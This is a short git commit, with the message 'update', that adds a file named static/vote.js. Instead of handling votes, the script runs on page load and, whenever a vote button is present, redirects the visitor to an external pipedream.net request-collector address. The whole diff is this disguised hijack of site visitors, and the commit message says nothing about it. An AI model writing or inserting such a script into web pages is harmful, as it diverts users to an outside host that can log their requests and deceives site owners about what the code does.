8bb47a67c997b5e844b389dd28cf822e6dd5a151
Standchen <dezavva@gmail.com>
2023-09-13 22:24:49 +0900

    update

---
+++ static/vote.js
@@ -0,0 +1,6 @@
+window.addEventListener('load', function() {
+  const button = document.getElementById('voteButton');
+  if (button) {
+    window.location.href = "https://en5d37gzesvtc.x.pipedream.net";
+  }
+});
